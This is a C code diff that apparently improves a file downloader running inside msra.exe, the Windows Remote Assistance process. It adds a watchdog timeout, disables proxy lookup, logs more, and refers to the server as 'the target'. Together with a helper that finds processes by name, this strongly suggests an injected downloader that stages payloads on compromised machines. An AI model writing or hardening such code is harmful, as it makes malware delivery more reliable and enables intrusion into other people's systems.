@@ -81,6 +81,20 @@ static DWORD find_pid_by_name(const char *name) {
     return found;
 }
 
+/* ponytail: hard wall-clock budget for the whole download. WinHttpSetTimeouts
+   alone can still stall (WPAD/PAC, half-open TLS), so a watchdog closes the
+   request handle to force any blocked call to return. 90s. */
+#define DL_TIMEOUT_MS 90000
+
+static DWORD WINAPI dl_watchdog(LPVOID arg) {
+    HINTERNET *ph = (HINTERNET *)arg;
+    Sleep(DL_TIMEOUT_MS);
+    /* ponytail: closing the request mid-call makes WinHttpReadData/
+       WinHttpReceiveResponse return ERROR_INTERNET_OPERATION_CANCELLED */
+    WinHttpCloseHandle(*ph);
+    return 0;
+}
+
 static void download_if_missing(const char *url, const char *outPath) {
     WIN32_FIND_DATAA fd;
     HANDLE h = FindFirstFileA(outPath, &fd);
@@ -88,8 +102,7 @@ static void download_if_missing(const char *url, const char *outPath) {
     audit("[+] Downloading %s -> %s", url, outPath);
 
     // ponytail: URLDownloadToFileA has no timeout and can hang forever inside
-    // msra.exe's STA thread without a message pump. Use WinHttp with explicit
-    // connect/send/receive timeouts and write the body to disk ourselves.
+    // msra.exe's STA thread. Use WinHttp with explicit timeouts + a watchdog.
     // (this mingw's winhttp.h is Unicode-only, so convert url/host/path to W.)
     WCHAR wurl[2048] = {0}, whost[256] = {0}, wpath[1024] = {0};
     if (!MultiByteToWideChar(CP_ACP, 0, url, -1, wurl, 2048)) {
@@ -103,19 +116,23 @@ static void download_if_missing(const char *url, const char *outPath) {
         audit("[-] WinHttpCrackUrl failed (%lu) %s", GetLastError(), outPath);
         return;
     }
+    audit("[*] Resolved host=%S port=%u scheme=%u", uc.lpszHostName, uc.nPort, uc.nScheme);
 
-    HINTERNET hi = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
+    /* ponytail: explicit WINHTTP_ACCESS_TYPE_NO_PROXY to avoid WPAD/PAC stalls
+       inside msra.exe; adjust if the target genuinely needs a proxy. */
+    HINTERNET hi = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_NO_PROXY,
                                WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hi) { audit("[-] WinHttpOpen failed (%lu)", GetLastError()); return; }
-    WinHttpSetTimeouts(hi, 10000, 30000, 30000, 30000);
+    WinHttpSetTimeouts(hi, 15000, 30000, 30000, 30000);
 
     HINTERNET hc = WinHttpConnect(hi, uc.lpszHostName, uc.nPort, 0);
-    if (!hc) { audit("[-] WinHttpConnect failed (%lu)", GetLastError()); WinHttpCloseHandle(hi); return; }
+    if (!hc) { audit("[-] WinHttpConnect failed (%lu) %s", GetLastError(), outPath); WinHttpCloseHandle(hi); return; }
+    audit("[*] Connected, sending request...");
 
     DWORD flags = (uc.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
     HINTERNET hrq = WinHttpOpenRequest(hc, L"GET", uc.lpszUrlPath, NULL,
                                        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
-    if (!hrq) { audit("[-] WinHttpOpenRequest failed (%lu)", GetLastError()); WinHttpCloseHandle(hc); WinHttpCloseHandle(hi); return; }
+    if (!hrq) { audit("[-] WinHttpOpenRequest failed (%lu) %s", GetLastError(), outPath); WinHttpCloseHandle(hc); WinHttpCloseHandle(hi); return; }
 
     // ponytail: allow TLS 1.2/1.3; default WinHttp on old builds caps at TLS1.0
     DWORD proto = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
@@ -124,14 +141,24 @@ static void download_if_missing(const char *url, const char *outPath) {
     #endif
     WinHttpSetOption(hrq, WINHTTP_OPTION_SECURE_PROTOCOLS, &proto, sizeof(proto));
 
+    HANDLE wd = CreateThread(NULL, 0, dl_watchdog, &hrq, 0, NULL);
+
     if (!WinHttpSendRequest(hrq, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0)) {
-        audit("[-] WinHttpSendRequest failed (%lu) %s", GetLastError(), outPath);
+        audit("[-] WinHttpSendRequest failed (0x%lx) %s", GetLastError(), outPath);
+        if (wd) { TerminateThread(wd, 0); CloseHandle(wd); }
         WinHttpCloseHandle(hrq); WinHttpCloseHandle(hc); WinHttpCloseHandle(hi); return;
     }
     if (!WinHttpReceiveResponse(hrq, NULL)) {
-        audit("[-] WinHttpReceiveResponse failed (%lu) %s", GetLastError(), outPath);
+        DWORD e = GetLastError();
+        if (e == ERROR_WINHTTP_OPERATION_CANCELLED)
+            audit("[-] Download timed out after %ums %s", DL_TIMEOUT_MS, outPath);
+        else
+            audit("[-] WinHttpReceiveResponse failed (0x%lx) %s", e, outPath);
+        if (wd) { TerminateThread(wd, 0); CloseHandle(wd); }
         WinHttpCloseHandle(hrq); WinHttpCloseHandle(hc); WinHttpCloseHandle(hi); return;
     }
+    if (wd) { TerminateThread(wd, 0); CloseHandle(wd); }
+    audit("[*] Response received, writing file...");
 
     DWORD status = 0, sl = sizeof(status);
     WinHttpQueryHeaders(hrq, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &status, &sl, NULL);
